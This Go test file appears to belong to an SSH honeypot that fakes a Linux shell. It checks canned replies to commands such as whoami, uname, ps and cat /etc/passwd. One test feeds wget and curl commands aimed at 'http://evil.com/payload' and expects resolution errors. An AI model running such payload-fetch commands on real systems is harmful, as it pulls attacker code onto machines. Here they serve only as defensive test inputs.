/*
©AngelaMos | 2026
commands_test.go
*/

package sshd

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func testCommandContext() *CommandContext {
	return &CommandContext{
		FS:       NewFakeFS("test-host"),
		Hostname: "test-host",
		Username: "admin",
		CWD:      "/root",
	}
}

func TestDispatchCommandTableDriven(t *testing.T) {
	ctx := testCommandContext()

	tests := []struct {
		name     string
		input    string
		contains string
	}{
		{"whoami", "whoami", "admin"},
		{"hostname", "hostname", "test-host"},
		{"pwd", "pwd", "/root"},
		{"uname bare", "uname", "Linux"},
		{"uname -a", "uname -a", "x86_64"},
		{"uname -r", "uname -r", "5.15.0"},
		{"uname -n", "uname -n", "ubuntu-server"},
		{"echo", "echo hello world", "hello world"},
		{"ps", "ps aux", "systemd"},
		{"uptime", "uptime", "load average"},
		{"free", "free", "Mem:"},
		{"df", "df", "/dev/sda1"},
		{"ifconfig", "ifconfig", "eth0"},
		{"ip addr", "ip addr", "127.0.0.1"},
		{"netstat", "netstat", "LISTEN"},
		{"nproc", "nproc", "2"},
		{"arch", "arch", "x86_64"},
		{"env", "env", "SHELL=/bin/bash"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := DispatchCommand(tt.input, ctx)
			assert.Contains(t, result, tt.contains)
		})
	}
}

func TestDispatchCommandUnknown(t *testing.T) {
	ctx := testCommandContext()

	result := DispatchCommand("notarealcommand", ctx)
	assert.Equal(t,
		"bash: notarealcommand: command not found\n",
		result,
	)
}

func TestDispatchCommandEmptyInput(t *testing.T) {
	ctx := testCommandContext()
	assert.Empty(t, DispatchCommand("", ctx))
}

func TestDispatchCommandIDRootVsNonRoot(t *testing.T) {
	rootCtx := testCommandContext()
	rootCtx.Username = "root"

	adminCtx := testCommandContext()
	adminCtx.Username = "admin"

	rootResult := DispatchCommand("id", rootCtx)
	assert.Contains(t, rootResult, "uid=0(root)")

	adminResult := DispatchCommand("id", adminCtx)
	assert.Contains(t, adminResult, "uid=1000(admin)")
}

func TestCatExistingAndMissing(t *testing.T) {
	ctx := testCommandContext()

	existing := DispatchCommand("cat /etc/passwd", ctx)
	assert.Contains(t, existing, "root:x:0:0")

	missing := DispatchCommand("cat /nonexistent", ctx)
	assert.Contains(t, missing, "No such file or directory")
}

func TestLsDirectory(t *testing.T) {
	ctx := testCommandContext()

	listing := DispatchCommand("ls /etc", ctx)
	require.NotEmpty(t, listing)
	assert.Contains(t, listing, "passwd")

	missing := DispatchCommand("ls /does-not-exist", ctx)
	assert.Contains(t, missing, "No such file or directory")
}

func TestCdChangesWorkingDirectory(t *testing.T) {
	ctx := testCommandContext()

	DispatchCommand("cd /tmp", ctx)
	assert.Equal(t, "/tmp", ctx.CWD)

	DispatchCommand("cd ..", ctx)
	assert.Equal(t, "/", ctx.CWD)

	DispatchCommand("cd", ctx)
	assert.Equal(t, "/root", ctx.CWD)
}

func TestWgetAndCurl(t *testing.T) {
	ctx := testCommandContext()

	tests := []struct {
		name     string
		input    string
		contains string
	}{
		{"wget url", "wget http://evil.com/payload", "unable to resolve"},
		{"wget no url", "wget", "missing URL"},
		{"curl url", "curl http://evil.com/payload", "Could not resolve host"},
		{"curl no url", "curl", "missing URL"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := DispatchCommand(tt.input, ctx)
			assert.Contains(t, result, tt.contains)
		})
	}
}

func TestWhichAndType(t *testing.T) {
	ctx := testCommandContext()

	assert.Contains(t, DispatchCommand("which ls", ctx), "/usr/bin/ls")
	assert.Contains(
		t,
		DispatchCommand("which nonexistent", ctx),
		"no nonexistent",
	)
	assert.Contains(t, DispatchCommand("type cd", ctx), "shell builtin")
	assert.Contains(t, DispatchCommand("type ls", ctx), "ls is /usr/bin/ls")
}

func TestResolvePathEdgeCases(t *testing.T) {
	tests := []struct {
		name   string
		path   string
		cwd    string
		expect string
	}{
		{"absolute", "/etc/passwd", "/root", "/etc/passwd"},
		{"relative", "tmp", "/", "/tmp"},
		{"tilde", "~", "/var", "/root"},
		{"tilde subpath", "~/bin", "/var", "/root/bin"},
		{"parent", "..", "/root", "/"},
		{"parent from nested", "..", "/usr/local/bin", "/usr/local"},
		{"current", ".", "/root", "/root"},
		{"empty", "", "/root", "/root"},
		{"root relative", "etc", "/", "/etc"},
		{"double parent", "../..", "/usr/local/bin", "/usr"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := resolvePath(tt.path, tt.cwd)
			assert.Equal(t, tt.expect, result)
		})
	}
}
